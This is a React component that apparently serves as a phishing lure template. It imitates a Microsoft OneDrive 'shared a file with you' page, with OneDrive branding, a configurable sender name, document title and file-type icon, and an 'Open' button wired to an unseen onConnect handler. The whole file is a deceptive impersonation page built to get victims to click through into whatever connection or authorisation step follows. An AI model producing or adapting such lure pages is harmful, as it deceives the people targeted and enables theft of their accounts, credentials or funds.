"use client";

import { Loader2 } from "lucide-react";

interface TemplateProps {
  documentTitle: string;
  docType: string;
  senderName: string;
  onConnect: () => void;
  connecting: boolean;
}

function DocIcon({ docType }: { docType: string }) {
  const colors: Record<string, string> = {
    PDF: "#E74C3C",
    DOCX: "#2B579A",
    XLSX: "#217346",
    PPTX: "#D24726",
    ZIP: "#F0AD4E",
  };
  const color = colors[docType] || "#0078D4";
  return (
    <div
      style={{
        width: 48,
        height: 56,
        borderRadius: 4,
        backgroundColor: color,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        color: "#fff",
        fontSize: 12,
        fontWeight: 700,
      }}
    >
      {docType}
    </div>
  );
}

export default function OneDriveTemplate({
  documentTitle,
  docType,
  senderName,
  onConnect,
  connecting,
}: TemplateProps) {
  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#1b1b1b",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
      }}
    >
      {/* Header */}
      <div
        style={{
          width: "100%",
          padding: "16px 24px",
          backgroundColor: "#0078D4",
          display: "flex",
          alignItems: "center",
          gap: 10,
        }}
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path d="M14 4L8.5 10H4L9.5 4H14Z" fill="#fff" opacity="0.8" />
          <path d="M20 8L13 16H6L13 8H20Z" fill="#fff" opacity="0.9" />
          <path d="M17 12L10 20H3L10 12H17Z" fill="#fff" />
        </svg>
        <span style={{ color: "#fff", fontSize: 16, fontWeight: 600 }}>OneDrive</span>
      </div>

      {/* Content */}
      <div
        style={{
          maxWidth: 480,
          width: "100%",
          margin: "80px auto 0",
          padding: "0 16px",
        }}
      >
        <div
          style={{
            backgroundColor: "#2d2d2d",
            borderRadius: 8,
            padding: 32,
            border: "1px solid #404040",
          }}
        >
          <p style={{ color: "#a0a0a0", fontSize: 13, marginBottom: 8 }}>
            {senderName} shared a file with you
          </p>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 16,
              padding: "16px 0",
              borderBottom: "1px solid #404040",
              marginBottom: 24,
            }}
          >
            <DocIcon docType={docType} />
            <div>
              <p style={{ color: "#e0e0e0", fontSize: 15, fontWeight: 600 }}>
                {documentTitle}
              </p>
              <p style={{ color: "#808080", fontSize: 12, marginTop: 2 }}>
                {docType} &middot; {new Date().toLocaleDateString()}
              </p>
            </div>
          </div>

          <button
            onClick={onConnect}
            disabled={connecting}
            style={{
              width: "100%",
              padding: "12px 24px",
              backgroundColor: connecting ? "#005a9e" : "#0078D4",
              color: "#fff",
              border: "none",
              borderRadius: 4,
              fontSize: 14,
              fontWeight: 600,
              cursor: connecting ? "not-allowed" : "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
            }}
          >
            {connecting && <Loader2 className="h-4 w-4 animate-spin" />}
            {connecting ? "Opening..." : "Open"}
          </button>
        </div>
      </div>
    </div>
  );
}
